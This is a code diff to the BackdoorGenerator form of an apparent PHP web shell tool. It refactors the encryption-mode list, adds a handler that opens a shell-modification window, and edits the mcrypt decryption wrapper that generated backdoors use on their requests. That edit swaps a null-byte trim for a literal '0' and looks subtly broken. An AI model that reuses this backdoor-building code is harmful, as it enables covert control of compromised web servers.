@@ -12,14 +12,6 @@ namespace bantam.Forms
     public partial class BackdoorGenerator : Form
     {
         /// <summary>
-        /// 
-        /// </summary>
-        private static readonly ReadOnlyCollection<string> requestEncryptionModes = new List<string> {
-             "openssl",
-             "mcrypt",
-        }.AsReadOnly();
-
-        /// <summary>
         /// Backdoor types matches combobox (todo)
         /// </summary>
         public enum BackdoorTypes
@@ -41,7 +33,7 @@ namespace bantam.Forms
 
             richTextBoxBackdoor.Text = generateBackdoor();
 
-            foreach(var mode in requestEncryptionModes) {
+            foreach(var mode in CryptoHelper.encryptoModeStrings) {
                 comboBoxRequestEncryptionType.Items.Add(mode);
             }
             comboBoxRequestEncryptionType.SelectedIndex = 0;
@@ -62,7 +54,7 @@ namespace bantam.Forms
         }
 
         /// <summary>
-        /// 
+        /// Saves backdoor contexts to file
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -147,6 +139,19 @@ namespace bantam.Forms
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void addClientToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ModifyShell modifyShell = new ModifyShell(txtBoxVarName.Text, comboBoxVarType.Text, chckbxGzipDecodeRequest.Checked, 
+                                                     checkBoxEncryptRequest.Checked, textBoxEncrpytionIV.Text, textBoxEncrpytionKey.Text, 
+                                                     textBoxIVVarName.Text, checkBoxSendIVInRequest.Checked, comboBoxRequestEncryptionType.Text);
+            modifyShell.Show();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
         /// <param name="varName"></param>
         /// <param name="method"></param>
         /// <param name="gzInflateRequest"></param>
@@ -186,7 +191,7 @@ namespace bantam.Forms
                                 requestEncryptionEnd = ", 'AES-256-CBC', '" + encryptionKey + "', OPENSSL_RAW_DATA, '" + encryptionIV + "')";
                             } else if (comboBoxRequestEncryptionType.Text == "mcrypt") {
                                 requestEncryptionStart = "rtrim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', ";
-                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, '" + encryptionIV + "'), \"\0\")";
+                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, '" + encryptionIV + "'), \"0\")";
                             }
                         }
                     }
